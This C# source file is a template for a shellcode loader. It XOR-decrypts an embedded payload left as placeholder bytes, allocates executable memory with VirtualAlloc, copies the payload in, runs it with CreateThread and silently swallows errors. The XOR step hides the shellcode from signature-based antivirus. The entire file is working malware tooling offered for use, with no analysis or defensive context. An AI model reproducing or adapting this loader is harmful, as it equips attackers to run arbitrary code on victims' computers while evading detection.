using System;
using System.Runtime.InteropServices;
using System.Text;

namespace BasicTemplate
{
    public class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
        private static uint MEM_COMMIT = 0x1000;
        private static uint PAGE_EXECUTE_READWRITE = 0x40;

        private static byte[] XorEncDec(byte[] input, byte[] theKey)
        {
            byte[] mixed = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                int length = i % theKey.Length;
                mixed[i] = (byte)(input[i] ^ theKey[length]);
            }
            return mixed;
        }

        static void Main()
        {
            try
            {
                byte[] encryptedShellcodeBytes = {XOR_ENCRYPTED_SHELL_CODE_BYTES};
                byte[] XorKey = { XOR_KEY_BYTES };
                byte[] shellcode = XorEncDec(encryptedShellcodeBytes, XorKey);
                if (shellcode.Length == 0)
                {
                    return;
                }
                IntPtr codeAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                if (codeAddr == IntPtr.Zero)
                {
                    return;
                }
                Marshal.Copy(shellcode, 0, codeAddr, shellcode.Length);
                uint threadId;
                IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, codeAddr, IntPtr.Zero, 0, out threadId);
                if (threadHandle == IntPtr.Zero)
                {
                    return;
                }
                uint result = WaitForSingleObject(threadHandle, 0xFFFFFFFF);
                if (result == 0xFFFFFFFF)
                {
                    return;
                }
            }
            catch (Exception) { }
        }
    }
}